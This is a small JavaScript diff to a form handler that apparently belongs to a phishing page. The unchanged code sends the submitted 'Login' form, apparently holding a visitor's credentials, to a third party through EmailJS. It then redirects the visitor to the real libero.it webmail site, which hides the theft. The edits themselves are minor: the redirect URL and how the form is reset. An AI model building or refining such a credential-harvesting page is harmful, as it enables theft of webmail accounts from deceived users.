@@ -12,13 +12,13 @@ document.getElementById('form')
         emailjs.sendForm(serviceID, templateID, this)
             .then(() => {
                 btn.value = 'Login';
-                window.location.href = 'https://www.libero.it'; // Redirect to the desired link
+                window.location.href = 'https://libero.it'; // Redirect to the desired link
             }, (err) => {
                 btn.value = 'Login';
                 alert(JSON.stringify(err));
             });
 
-        form.reset();
+       event.target.reset();
         return false;
     });
 
@@ -58,3 +58,4 @@ inputPlaceholder.forEach((input) => {
     });
 
 });
+
